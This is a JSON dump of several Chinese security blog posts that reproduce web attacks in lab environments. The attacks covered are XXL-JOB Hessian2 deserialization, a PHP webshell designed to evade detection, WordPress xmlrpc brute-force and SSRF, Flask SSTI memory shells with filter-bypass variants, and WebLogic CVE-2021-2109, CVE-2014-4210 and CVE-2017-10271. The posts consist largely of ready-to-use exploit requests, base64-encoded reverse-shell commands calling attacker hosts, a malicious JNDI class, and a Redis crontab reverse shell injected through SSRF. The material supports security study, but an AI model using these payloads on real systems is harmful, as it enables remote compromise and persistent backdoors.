对于mysqlimport客户端，默认情况下不使用本地数据加载。要显式禁用或启用它，请使用 --local=0或 --local[=1\\]选项。 如果LOAD DATA LOCAL在Perl脚本或其他[client]从选项文件中读取该组的程序中使用，则可以向该组添加 local-infile选项设置。为防止不理解此选项的程序出现问题，请使用loose- 前缀指定它 ： 123&gt; [client]&gt; loose-local-infile=0&gt; 或者： 123&gt; [client]&gt; loose-local-infile=1&gt; 在所有情况下，LOCAL 客户端成功使用加载操作还需要服务器允许本地加载。 如果LOCAL禁用了此功能，则在服务器或客户端上，尝试发出LOAD DATA LOCAL语句的客户端都会 收到以下错误消息： 12&gt; ERROR 1148: The used command is not allowed with this MySQL version&gt; 0x02 MySQL蜜罐利用该漏洞可以制作MySQL蜜罐来诱使攻击者连接，从而窃取攻击者主机上的敏感信息。GitHub上已有可以读取攻击者微信ID的MySQL蜜罐，具体参见：https://github.com/qigpig/MysqlHoneypot","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"MySQL","slug":"MySQL","permalink":"https://www.mi1k7ea.com/tags/MySQL/"}]},{"title":"XXL-JOB Hessian2反序列化漏洞","date":"2021-04-22T09:24:12.000Z","path":"2021/04/22/XXL-JOB-Hessian2反序列化漏洞/","text":"0x00 前言学习。 参考：xxl-job api未授权Hessian2反序列化 0x01 XXL-JOB Hessian2反序列化漏洞影响版本XXL-JOB &lt;= 2.0.2 漏洞原理XXL-JOB在2.0.2及以下版本中的接口存在未授权访问漏洞，该接口会进行Hessian2反序列化操作，导致存在Hessian2反序列化漏洞从而RCE。 漏洞复现未授权访问API探测：/xxl-job-admin/api 启动恶意JNDI注入利用服务（工具地址：https://github.com/welk1n/JNDI-Injection-Exploit），这里打DNSLog验证： 1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C \"curl xxljob.7phxqp.dnslog.cn\" 利用最新版marshalsec的Hessian2这个Gadget来生成payload： 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor rmi://x.x.x.x:1099/ic9mnr &gt; xxl.ser 在Burp中，使用”Paste from file”选项从文件中直接复制Hessian2序列化内容到POST的body中，发送攻击报文，如下响应内容即无序列化内容的格式问题： 恶意RMI服务端接受到请求： 打到DNSLog： 漏洞分析漏洞版本代码：https://github.com/xuxueli/xxl-job/releases/tag/2.0.2 看到对应存在未授权访问漏洞的API即/xxl-job-admin/api，代码位于com/xxl/job/admin/controller/JobApiController.java，其中注解PermessionLimit中limit的值为false即并没有限制权限： 往下看，会对请求中读取到的字节码进行反序列化操作： 上述的deserialize()函数是抽象类Serializer的函数，具体的还得”Ctrl+Alt+B”查看该抽象类的具体实现类中对应的重写后的方法，这里找到有HessianSerializer的： 其中就是Hessian2反序列化操作了： 前面出现了好几个抽象类deserialize()函数的实现类，怎么会偏偏是Hessian2的呢？ 看到XXL-JOB的动态调度器中查看，位于com/xxl/job/admin/core/schedule/XxlJobDynamicScheduler.java，这里的启动的时候即调用start()函数时会调用initRpcProvider()函数，而该函数在初始化RPC Provider时明确指定了XmlRpcProviderFactory的序列化器为Hessian2的： 至此，OK。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"XXL-JOB","slug":"XXL-JOB","permalink":"https://www.mi1k7ea.com/tags/XXL-JOB/"}]},{"title":"通过spl_autoload_register实现PHP免杀WebShell","date":"2021-04-21T14:46:25.000Z","path":"2021/04/21/通过spl-autoload-register实现PHP免杀WebShell/","text":"0x00 前言参考自：https://mp.weixin.qq.com/s/WiqZEApL3nVgZDv7nJ4gOw 0x01 spl_autoload_register()函数SPL是Standard PHP Library(标准PHP库)的缩写。它是PHP5引入的一个扩展库，其主要功能包括autoload机制的实现及包括各种Iterator接口或类。 SPL autoload机制的实现是通过将函数指针autoload_func指向自己实现的具有自动装载功能的函数来实现的。 spl_autoload_register()函数：注册给定的函数作为__autoload的实现。当尝试加载未定义的类时，就会调用SPL __autoload中注册的函数。 支持版本：PHP 5 &gt;= 5.1.0, PHP 7 函数定义： 1spl_autoload_register ( callable $autoload_function = ? , bool $throw = true , bool $prepend = false ) : bool 参数说明： autoload_function：欲注册的自动装载函数。如果没有提供任何参数，则自动注册 autoload 的默认实现函数spl_autoload()。 throw：此参数设置了 autoload_function 无法成功注册时， spl_autoload_register()是否抛出异常。 prepend：如果是 true，spl_autoload_register() 会添加函数到队列之首，而不是队列尾部。 0x02 免杀WebShellDemo代码： 1234567&lt;?phpspl_autoload_register(function ($class_name)&#123; file_put_contents(base64_decode(\"YWFh\"), base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='));&#125;);include('aaa');new aaa();?&gt; 第一次访问： 先调用spl_autoload_register()函数注册一个__autoload的匿名函数，其中将&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;（第二个Base64编码内容）内容写入名为aaa（第一个Base64编码内容）的文件中，注意这一步只是注册了这个匿名函数、并未执行函数中的代码逻辑； 包含aaa文件进来，但由于文件不存在因此报错； 新建一个aaa类实例，因为aaa类不存在，因此会去调用第一步中注册的匿名函数，其中将一句话木马写入了aaa文件中； 第二次访问，由于aaa文件已生成，成功包含该文件进而getshell（这里找不到aaa类的错误无需关注）：","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"},{"name":"WebShell","slug":"WebShell","permalink":"https://www.mi1k7ea.com/tags/WebShell/"}]},{"title":"WordPress渗透测试","date":"2021-04-21T02:03:48.000Z","path":"2021/04/21/WordPress渗透测试/","text":"0x00 前言个人笔记。 0x01 WPScanKali中自带： 1kali@kali:~$ wpscan --proxy protocol://ip:port --url http://a.com/ 0x02 xmlrpc.php探测方法1234&lt;methodCall&gt; &lt;methodName&gt;system.listMethods&lt;/methodName&gt; &lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt; 暴破账号1234567&lt;methodCall&gt; &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt; &lt;params&gt; &lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt; &lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt; &lt;/params&gt;&lt;/methodCall&gt; SSRF前提是WP版本 &lt;= 3.5.1。如果高于该版本只能DNSLog验证，也能用于向其他机子发起DoS攻击。 1234567891011&lt;methodCall&gt; &lt;methodName&gt;pingback.ping&lt;/methodName&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt;&lt;string&gt;http://127.0.0.1:80&lt;/string&gt;&lt;/value&gt; &lt;/param&gt; &lt;param&gt; &lt;value&gt;&lt;string&gt;http://localhost/wordpress/?p=1&lt;/string&gt;&lt;/value&gt; &lt;/param&gt; &lt;/params&gt;&lt;/methodCall&gt; 如果目标IP和端口存在，则响应包中的&lt;value&gt;&lt;int&gt;中的值大于0。 利用脚本：https://github.com/FireFart/WordpressPingbackPortScanner 除了端口扫描外，还能结合file://协议来读取本地文件： 1234567891011&lt;methodCall&gt; &lt;methodName&gt;pingback.ping&lt;/methodName&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt;&lt;string&gt;file:///var/log/apache2/access_log&lt;/string&gt;&lt;/value&gt; &lt;/param&gt; &lt;param&gt; &lt;value&gt;&lt;string&gt;http://localhost/wordpress/?p=1&lt;/string&gt;&lt;/value&gt; &lt;/param&gt; &lt;/params&gt;&lt;/methodCall&gt;","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"},{"name":"WordPress","slug":"WordPress","permalink":"https://www.mi1k7ea.com/tags/WordPress/"}]},{"title":"通过WebRTC获取代理池中攻击者真实IP","date":"2021-04-20T15:06:35.000Z","path":"2021/04/20/通过WebRTC获取代理池中攻击者真实IP/","text":"0x00 前言参考学蚁致用的文章：【热剩饭】获取代理池背后攻击者的真实IP 0x01 WebRTCWebRTC (Web Real-Time Communications) 是一项实时通讯技术，它允许网络应用或者站点，在不借助中间媒介的情况下，建立浏览器之间点对点（Peer-to-Peer）的连接，实现视频流和（或）音频流或者其他任意数据的传输。WebRTC包含的这些标准使用户在无需安装任何插件或者第三方的软件的情况下，创建点对点（Peer-to-Peer）的数据分享和电话会议成为可能。 WebRTC支持发送UDP请求。 WebRTC相关API参考：https://developer.mozilla.org/zh-CN/docs/Web/API/WebRTC_API 0x02 通过WebRTC获取代理池中攻击者真实IP基本原理攻击者一般都喜欢使用Socks5类型的代理池来隐藏自己的真实IP。Socks5协议本身是支持UDP协议的，但是大多数的代理客户端并没有去实现。 因此，如果攻击者使用的Socks5类型代理只是转发所有的TCP请求而不支持UDP请求，那么就可以在网页上发起一个UDP请求从而获取到攻击者的真实出口IP。 DemoWebRTC支持UDP协议，而且在大多数浏览器中都是默认开启的。 即使Socks5代理支持UDP协议，但是WebRTC并不会走代理，因为其设计之初就是为了点对点通信。 webrtc.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt; &lt;/head&gt; &lt;body&gt; Remote Addr: &lt;?=$_SERVER['REMOTE_ADDR']?&gt; &lt;hr&gt; &lt;h3&gt;WebRTC&lt;/h3&gt; &lt;h4&gt;Your local IP addresses:&lt;/h4&gt; &lt;ul id=\"localip\"&gt;&lt;/ul&gt; &lt;h4&gt;Your public IP addresses:&lt;/h4&gt; &lt;ul id=\"publicip\"&gt;&lt;/ul&gt; &lt;h4&gt;Your IPv6 addresses:&lt;/h4&gt; &lt;ul id=\"ipv6\"&gt;&lt;/ul&gt; &lt;iframe id=\"rtc_iframe\" sandbox=\"allow-same-origin\" style=\"display: none\"&gt;&lt;/iframe&gt; &lt;script&gt; //get the IP addresses associated with an account function getIPs(callback)&#123; var ip_dups = &#123;&#125;; //compatibility for firefox and chrome var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.msRTCPeerConnection || window.webkitRTCPeerConnection; var useWebKit = !!window.webkitRTCPeerConnection; //bypass naive webrtc blocking using an iframe if(!RTCPeerConnection)&#123; var win = document.getElementById(\"rtc_iframe\").contentWindow; RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.msRTCPeerConnection || win.webkitRTCPeerConnection; useWebKit = !!win.webkitRTCPeerConnection; &#125; //minimal requirements for data connection var mediaConstraints = &#123; optional: [&#123;RtpDataChannels: true&#125;] &#125;; var servers = &#123; iceServers: [ &#123; urls: [ 'stun:stun.l.google.com:19302?transport=udp', 'stun:stun1.l.google.com:19302?transport=udp', 'stun:stun2.l.google.com:19302?transport=udp', 'stun:stun3.l.google.com:19302?transport=udp', 'stun:stun4.l.google.com:19302?transport=udp', \"stun:stun.ekiga.net?transport=udp\", \"stun:stun.ideasip.com?transport=udp\", \"stun:stun.rixtelecom.se?transport=udp\", \"stun:stun.schlund.de?transport=udp\", \"stun:stun.stunprotocol.org:3478?transport=udp\", \"stun:stun.voiparound.com?transport=udp\", \"stun:stun.voipbuster.com?transport=udp\", \"stun:stun.voipstunt.com?transport=udp\", \"stun:stun.voxgratia.org?transport=udp\" ] &#125; ] &#125;; //construct a new RTCPeerConnection var pc; try &#123; pc = new RTCPeerConnection(servers, mediaConstraints); &#125; catch (e) &#123; return &#125; function handleCandidate(candidate)&#123; //match just the IP address var ip_regex = /([0-9]&#123;1,3&#125;(\\.[0-9]&#123;1,3&#125;)&#123;3&#125;|[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)/ var ip_addr = ip_regex.exec(candidate)[1]; //remove duplicates if(ip_dups[ip_addr] === undefined) callback(ip_addr); ip_dups[ip_addr] = true; &#125; //listen for candidate events pc.onicecandidate = function(ice)&#123; //skip non-candidate events if(ice.candidate) handleCandidate(ice.candidate.candidate); &#125;; //create a bogus data channel pc.createDataChannel(\"bl\"); //create an offer sdp try &#123; pc.createOffer().then(function(result) &#123; pc.setLocalDescription(result); &#125;); &#125; catch (e) &#123; pc.createOffer().then(function(result) &#123; pc.setLocalDescription(result, function()&#123;&#125;, function()&#123;&#125;); &#125;, function() &#123;&#125;); &#125; //wait for a while to let everything done setTimeout(function()&#123; //read candidate info from local description var lines = pc.localDescription.sdp.split('\\n'); lines.forEach(function(line)&#123; if(line.indexOf('a=candidate:') === 0) handleCandidate(line); &#125;); &#125;, 1000); &#125; //insert IP addresses into the page getIPs(function(ip)&#123; var li = document.createElement(\"li\"); li.textContent = ip; //local IPs if (ip.match(/^(192\\.168\\.|169\\.254\\.|10\\.|172\\.(1[6-9]|2\\d|3[01]))/)) document.getElementById(\"localip\").appendChild(li); //IPv6 addresses else if (ip.match(/^[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;$/)) document.getElementById(\"ipv6\").appendChild(li); //assume the rest are public IPs else document.getElementById(\"publicip\").appendChild(li); &#125;);&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 使用Socks5代理访问，成功获取到真实出口IP： 云函数代理池测试待测试分析… 红蓝对抗借鉴红队 专用打点浏览器，禁掉WebRTC功能： Chrome：在Chrome应用商店里，安装一个名为WebRTC Leak Prevent的扩展，然后选择Disable non-proxied UDP(force proxy)即可。 Firefox：在浏览器上输入about:config，之后搜索media.peerconnection.enabled，找到它后双击，将其改成false即可。 改用VPN； 禁掉了WebRTC后，推荐用热点，再挂代理池； 蓝队 外网打点页面嵌入，如WAF拦截页面； 蜜罐页面嵌入； 不仅局限于WebRTC，研究其他基于UDP协议的功能；","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"红队","slug":"红队","permalink":"https://www.mi1k7ea.com/tags/红队/"}]},{"title":"浅析Python Flask内存马","date":"2021-04-07T11:32:22.000Z","path":"2021/04/07/浅析Python-Flask内存马/","text":"0x00 前言最近看到一个Python Flask内存马，学习一下：https://github.com/iceyhexman/flask_memory_shell 0x01 Python Flask内存马复现简单写个Flask SSTI漏洞环境： 12345678910111213141516from flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route('/')def home(): person = 'guest' if request.args.get('name'): person = request.args.get('name') template = '&lt;h2&gt;Hello %s!&lt;/h2&gt;' % person return render_template_string(template)if __name__ == \"__main__\": app.run() 原始Flask内存马payload，其中的默认命令也可以去掉： 1url_for.__globals__['__builtins__']['eval'](\"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())\",&#123;'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']&#125;) 访问如下URL生成Flask内存马： 1http://127.0.0.1:5000/?name=&#123;&#123;url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125; 最后访问/shell内存马接口即可执行任意命令： 分析我们将payload拆开来逐层分析： 123456789101112url_for.__globals__['__builtins__']['eval']( \"app.add_url_rule( '/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read() ) \", &#123; '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'], 'app':url_for.__globals__['current_app'] &#125;) url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]这个是Flask SSTI中的payload。 url_for()是Flask的一个内置函数： 通过Flask内置函数可以调用其__globals__属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，这里看到是支持__builtins__的： __builtins__即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于__builtins__却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。其中是包含eval、exec等函数的： 直接调用就能执行命令了： app.add_url_rule()函数在Flask中注册路由的时候是添加的`@app.route()`装饰器来实现的。 点进去看到其源码实现，其调用了add_url_rule()函数来添加路由： add_url_rule()函数定义： 1add_url_rule(rule, endpoint=None, view_func=None, provide_automatic_options=None, **options) 参数说明： rule：函数对应的URL规则，满足条件和app.route()的第一个参数一样，必须以/开头； endpoint：端点，即在使用url_for()进行反转的时候，这里传入的第一个参数就是endpoint对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为endpoint的值； view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号）； provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options =添加规则前为False； options：要转发到基础规则对象的选项。Werkzeug的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听GET（并隐式地侦听HEAD）。从Flask0.6开始，通过标准请求处理隐式添加和处理选项； 由此可见，payload这部分是动态添加了一条路由，而处理该路由的函数是个由lambda关键字定义的匿名函数。 lambda与_request_ctx_stacklambda即匿名函数，payload中add_url_rule()函数的第三个参数定义了一个lambda匿名函数，其中通过os库的popen()函数执行从Web请求中获取的cmd参数值并返回结果，其中该参数值默认为whoami。 _request_ctx_stack是Flask的一个全局变量，是一个LocalStack实例。 Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为_request_ctx_stack 的栈结构中，也就是说获取当前的请求上下文等同于获取_request_ctx_stack的栈顶元素_request_ctx_stack.top 。 绕过变形以Python沙箱逃逸的技巧为例： url_for可用get_flashed_messages或request.application.__self__._get_data_for_json等替换； 代码执行函数替换，如exec等替换eval； 字符串可采用拼接方式，如[&#39;__builtins__&#39;][&#39;eval&#39;]变为[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]； __globals__可用__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)替换； []中括号可用.__getitem__()或.pop()替换； … 1request.application.__self__._get_data_for_json.__getattribute__('__globa'+'ls__').__getitem__('__bui'+'ltins__').__getitem__('ex'+'ec')(\"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'calc')).read())\",&#123;'_request_ct'+'x_stack':get_flashed_messages.__getattribute__('__globa'+'ls__').pop('_request_'+'ctx_stack'),'app':get_flashed_messages.__getattribute__('__globa'+'ls__').pop('curre'+'nt_app')&#125;)","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"},{"name":"SSTI","slug":"SSTI","permalink":"https://www.mi1k7ea.com/tags/SSTI/"},{"name":"内存马","slug":"内存马","permalink":"https://www.mi1k7ea.com/tags/内存马/"}]},{"title":"浅析WebLogic JNDI注入RCE（CVE-2021-2109）","date":"2021-04-06T07:52:57.000Z","path":"2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/","text":"0x00 前言简单学习WebLogic JNDI注入RCE（CVE-2021-2109）。 0x01 WebLogic JNDI注入RCE（CVE-2021-2109）环境搭建用的Vulhub： 影响版本Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0。 前提条件拥有访问/console/consolejndi.portal页面的用户权限，或者存在CVE-2020-14883未授权访问漏洞。 漏洞原理WebLogic的/console/consolejndi.portal接口可以调用存在JNDI注入漏洞的com.bea.console.handles.JndiBindingHandle类，从而造成RCE。 漏洞复现环境搭建好之后，利用前面CVE-2020-14883的未授权访问漏洞可以直接访问到consolejndi.portal页面： 1http://ip:7001/console/css/%252e%252e%252fconsolejndi.portal 先来编写一个恶意类Exp，其中payload为打DNSLog外带验证： 12345678910111213141516171819202122import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;public class Exp &#123; public Exp() throws Exception &#123; //Process p = Runtime.getRuntime().exec(newString[]&#123;\"cmd\",\"/c\",\"calc.exe\"&#125;); Process p = Runtime.getRuntime().exec(new String[]&#123;\"/bin/bash\",\"-c\",\"echo 'Y3VybCBodHRwOi8vd2VibG9naWMudnZkN3FzLmRuc2xvZy5jbi8=' | base64 -d | bash\"&#125;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) &#123; System.out.println(line); &#125; p.waitFor(); is.close(); reader.close(); p.destroy(); &#125;&#125; 开启Web服务，其中存放上述恶意类以供JNDI注入远程加载访问： 1python -m SimpleHTTPServer 88 开启恶意LDAP服务： 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://172.19.0.1:88/#Exp 9998 原始Exp： 1/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://172.19.0;1:9998/aew0xy;AdminServer%22) 结合未授权访问漏洞的Exp： 1/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://172.19.0;1:9998/aew0xy;AdminServer%22) 在LDAP服务端和Web服务端都有记录： DNSLog外带成功： 证明存在漏洞且能外连，要反弹shell的话直接修改Exp类执行的命令在base64编码即可： 12// bash -i &gt;&amp; /dev/tcp/172.19.0.1/6666 0&gt;&amp;1Process p = Runtime.getRuntime().exec(new String[]&#123;\"/bin/bash\",\"-c\",\"echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4xLzY2NjYgMD4mMQ==' | base64 -d | bash\"&#125;); 更新Web服务上的Exp类后，再发一次报文就能成功获取到shell了： 漏洞分析参考： https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw https://y4er.com/post/weblogic-cve-2021-2109-jndi-rce/ 待分析… 防御方法升级WebLogic版本。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"WebLogic","slug":"WebLogic","permalink":"https://www.mi1k7ea.com/tags/WebLogic/"}]},{"title":"浅析WebLogic SSRF（CVE-2014-4210）","date":"2021-04-05T16:14:07.000Z","path":"2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/","text":"0x00 前言简单学习WebLogic SSRF（CVE-2014-4210），这个漏洞已经很老了。 0x01 WebLogic SSRF（CVE-2014-4210）环境搭建用的Vulhub：https://vulhub.org/#/environments/weblogic/ssrf/ 影响版本Oracle WebLogic Server 10.0.2, 10.3.6。 漏洞原理WebLogic的SearchPublicReqistries.jsp接口存在SSRF漏洞，如果服务端或内网存在Redis未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。 漏洞复现无需登录，可以直接访问/uddiexplorer/接口，其中漏洞接口如图中所指的Search Public Registries： 访问存活的地址： 1/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 此时返回的错误信息是： 1weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code &amp;#40;Not Found&amp;#41;. Please ensure that your URL is correct, and the web service has deployed without error. 访问不存在的地址： 1/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7000 此时返回的错误信息是： 1weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &amp;#39;1&amp;#39; addresses, but could not connect over HTTP to server: &amp;#39;127.0.0.1&amp;#39;, port: &amp;#39;7000&amp;#39; 根据二元组的返回结果，就可以判断目标机子的端口服务是否开放，从而进行相应的SSRF攻击。 接着结合内网存在的Redis未授权访问进行利用。 先探测内网是否存在Redis服务： 1/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.24.0.2:6379 根据响应返回内容看到网络是通的，该内网IP存在Redis服务。 写入crontab计划通过bash反弹shell： 1234set 1 &quot;\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c &apos;bash -i &gt;&amp; /dev/tcp/172.22.0.1/6666 0&gt;&amp;1&apos;\\n\\n\\n\\n&quot;config set dir /etc/config set dbfilename crontabsave 对其进行URL编码： 1set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.22.0.1%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave 放到存在SSRF的参数值URL后面，注意在前面和后面分别添加%0D%0A%0D%0A来实现HTTP头CRLF注入： 1/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.24.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.22.0.1%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 在Redis服务机子上成功写入crontab： 成功通过crontab定时任务反弹shell： crontab写入Tips： /etc/crontab /etc/cron.d/*：将任意文件写到该目录下，效果和crontab相同，格式也要一致，并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹shell； /var/spool/cron/root：CentOS系统下root用户的cron文件； /var/spool/cron/crontabs/root：Debian系统下root用户的cron文件； 漏洞分析待分析… 防御方法升级WebLogic版本。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"WebLogic","slug":"WebLogic","permalink":"https://www.mi1k7ea.com/tags/WebLogic/"}]},{"title":"浅析WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）","date":"2021-04-05T14:21:19.000Z","path":"2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/","text":"0x00 前言简单学习WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）。 0x01 WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）环境搭建用的Vulhub：https://vulhub.org/#/environments/weblogic/CVE-2017-10271/ 影响版本Oracle WebLogic Server 。 漏洞原理WebLogic的WLS Security组件对外提供WebService服务，其中使用XMLDecoder来解析XML格式数据，其存在反序列化漏洞，从而导致RCE。 漏洞复现直接发送PoC报文如下，利用DNSLog外带验证（报文内容类型是SOAP型WebService报文，参考之前的WebService渗透测试文章来构造即可）： 12345678910111213141516171819202122232425262728293031POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;ping weblogic.16qkmh.dnslog.cn&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; DNSLog看到请求记录： 漏洞利用直接反弹shell反弹shell的Exp报文，将PoC中填入命令的那一行修改下即可（其实特殊符号无需编码也可以）： 1&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/172.19.0.2/21 0&amp;gt;&amp;amp;1&lt;/string&gt; exploit-db中的Exp脚本，直接用于反弹shell：https://www.exploit-db.com/exploits/43458/ 